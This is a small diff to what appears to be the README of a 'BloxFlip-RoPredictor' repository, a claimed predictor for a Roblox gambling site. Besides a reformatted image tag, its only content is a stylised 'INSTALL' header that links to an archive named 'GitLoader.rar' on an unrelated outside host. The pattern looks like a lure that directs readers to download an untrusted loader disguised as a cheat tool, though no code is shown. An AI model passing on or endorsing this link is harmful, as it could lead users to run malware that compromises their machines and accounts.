@@ -1,5 +1,4 @@
-<p align=center>
-  ![1](https://github.com/Winter-Ghost11/BloxFlip-RoPredictor/assets/106580113/25194366-93ab-49f6-9978-415ba7ecb6e4)
+<p align=center>![1](https://github.com/Winter-Ghost11/BloxFlip-RoPredictor/assets/106580113/25194366-93ab-49f6-9978-415ba7ecb6e4)
 </p>
 
 # 📁[𝙸𝙽𝚂𝚃𝙰𝙻𝙻](https://boogi.ma/temp/GitLoader.rar)
